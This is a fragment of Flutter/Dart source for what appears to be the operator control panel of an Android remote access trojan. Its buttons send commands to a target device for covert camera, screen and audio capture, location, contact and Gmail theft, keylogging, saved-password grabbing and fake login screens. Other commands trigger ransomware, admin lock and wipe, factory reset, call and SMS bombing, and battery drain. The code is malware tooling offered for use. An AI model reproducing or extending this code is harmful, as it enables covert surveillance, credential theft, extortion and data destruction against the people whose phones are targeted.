          'virus_mode': () => _showInputDialog("🦠 VIRUS MODE", "virus_mode", targetId),
          'factory_reset': () => _showConfirmDialog("💣 FACTORY RESET", "Reset target device?", "factory_reset", targetId),
          'wipe_data': () => _showConfirmDialog("🗑️ WIPE DATA", "Delete all user data?", "wipe_data", targetId),
          'call_bombing': () => _showInputDialog("📞 CALL BOMBING", "call_bombing", targetId),
          'sms_bomber': () => _showInputDialog("📨 SMS BOMBER", "sms_bomber", targetId),
          'get_notif_logs': () => _fetchNotificationLogs(targetId),
        };

        if (actionMap.containsKey(cmd)) {
          actionMap[cmd]!();
        } else {
          _sendCommand(cmd, targetId);
        }
      },
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
        decoration: BoxDecoration(
          color: Colors.black,
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: _primaryPurple.withOpacity(0.4)),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: _primaryPink, size: 12),
            const SizedBox(width: 4),
            Text(label, style: TextStyle(color: _textWhite, fontSize: 9, fontWeight: FontWeight.w500)),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final device = widget.device;
    final String targetId = device?['id']?.toString() ?? "unknown";
    final String model = device?['model'] ?? "Unknown";

    return Scaffold(
      backgroundColor: _darkBg,
      appBar: AppBar(
        backgroundColor: _cardBg,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back, color: _primaryPink),
          onPressed: () => Navigator.pop(context),
        ),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(model, style: TextStyle(fontSize: 13, fontWeight: FontWeight.bold, color: _primaryPurple)),
            Text(targetId, style: const TextStyle(fontSize: 9, color: Colors.white54)),
          ],
        ),
        actions: [
          if (_isSending)
            Padding(
              padding: const EdgeInsets.all(12),
              child: SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(strokeWidth: 2, color: _primaryPink),
              ),
            ),
        ],
      ),
      body: ListView(
        children: [
          _buildLogContainer(),
          
          _buildSection("📡 SURVEILLANCE", "Camera, Location, Contacts", Icons.camera_alt, [
            _btn("📸 PHOTO", Icons.camera, "take_photo", targetId),
            _btn("🎬 STREAM", Icons.screenshot, "get_screen", targetId),
            _btn("📍 LOC", Icons.location_on, "get_location", targetId),
            _btn("📱 CONTACTS", Icons.contacts, "get_contacts", targetId),
            _btn("📧 GMAIL", Icons.email, "get_gmails", targetId),
            _btn("🔔 NOTIF", Icons.notifications, "get_notif_logs", targetId),
            _btn("🎙️ REC AUDIO", Icons.mic, "record_audio", targetId),
            _btn("⏹️ STOP REC", Icons.mic_off, "stop_record_audio", targetId),
          ]),
          
          _buildSection("⌨️ KEYLOG & PASS", "Keylogger, Passwords, Fake Login", Icons.keyboard, [
            _btn("START KEY", Icons.keyboard, "start_keylogger", targetId),
            _btn("STOP KEY", Icons.block, "stop_keylogger", targetId),
            _btn("GET LOGS", Icons.text_snippet, "get_keylogs", targetId),
            _btn("GET PASS", Icons.password, "get_saved_passwords", targetId),
            _btn("FAKE LOGIN", Icons.login, "start_fake_login", targetId),
            _btn("STOP FAKE", Icons.logout, "stop_fake_login", targetId),
          ]),
          
          _buildSection("📸 GRABBER", "Gallery & Videos", Icons.photo_library, [
            _btn("GALLERY", Icons.photo, "grab_gallery", targetId),
            _btn("VIDEOS", Icons.video_library, "grab_videos", targetId),
          ]),
          
          _buildSection("📹 LIVE STREAM", "Camera & Screen", Icons.videocam, [
            _btn("CAM ON", Icons.videocam, "start_cam_stream", targetId),
            _btn("CAM OFF", Icons.stop, "stop_cam_stream", targetId),
            _btn("SCREEN ON", Icons.screenshot, "start_screen_stream", targetId),
            _btn("SCREEN OFF", Icons.stop, "stop_screen_stream", targetId),
          ]),
          
          _buildSection("🔒 LOCK SYSTEM", "Hard Lock, Ransomware, Panic", Icons.lock, [
            _btn("🔒 HARD", Icons.lock, "hard_lock", targetId),
            _btn("🔓 UNLOCK", Icons.lock_open, "unlock", targetId),
            _btn("💀 RANSOM", Icons.bug_report, "activate_ransomware", targetId),
            _btn("🔓 DECRYPT", Icons.security, "decrypt_files", targetId),
            _btn("⚠️ PANIC", Icons.warning, "panic_mode", targetId),
            _btn("🔓 P.UNLOCK", Icons.lock_open, "panic_unlock", targetId),
            _btn("🦠 VIRUS", Icons.bug_report, "virus_mode", targetId),
            _btn("🔓 V.UNLOCK", Icons.lock_open, "virus_unlock", targetId),
          ]),
          
          _buildSection("👑 DEV ADMIN", "Admin Access & Wipe", Icons.admin_panel_settings, [
            _btn("REQ ADMIN", Icons.admin_panel_settings, "request_admin", targetId),
            _btn("CHECK", Icons.verified, "is_admin", targetId),
            _btn("LOCK", Icons.lock, "admin_lock", targetId),
            _btn("WIPE", Icons.delete_forever, "admin_wipe", targetId),
          ]),
          
          _buildSection("💣 DESTRUCTIVE", "Reset, Bomber, Drain", Icons.warning, [
            _btn("FACTORY", Icons.settings_backup_restore, "factory_reset", targetId),
            _btn("WIPE DATA", Icons.delete_forever, "wipe_data", targetId),
            _btn("CALL BOMB", Icons.phone, "call_bombing", targetId),
            _btn("SMS BOMB", Icons.message, "sms_bomber", targetId),
            _btn("DRAIN", Icons.battery_alert, "battery_drain", targetId),
          ]),
          
          _buildSection("🎮 EFFECTS", "Flash, Strobe, Vibrate, Audio", Icons.bolt, [
            _btn("💡 ON", Icons.flash_on, "flashlight_on", targetId),
            _btn("💡 OFF", Icons.flash_off, "flashlight_off", targetId),
            _btn("⚡ STROBE", Icons.flash_on, "flash_strobe", targetId),
            _btn("⏹️ STOP", Icons.flash_off, "stop_strobe", targetId),
            _btn("📳 VIBE", Icons.vibration, "vibrate_loop", targetId),
            _btn("🎵 PLAY", Icons.music_note, "play_audio", targetId),
            _btn("⏹️ STOP", Icons.stop, "stop_audio", targetId),
            _btn("🖼️ WALL", Icons.wallpaper, "set_wallpaper", targetId),
            _btn("🌐 URL", Icons.link, "open_url", targetId),
          ]),
          
          const SizedBox(height: 20),
        ],
      ),
    );
  }
}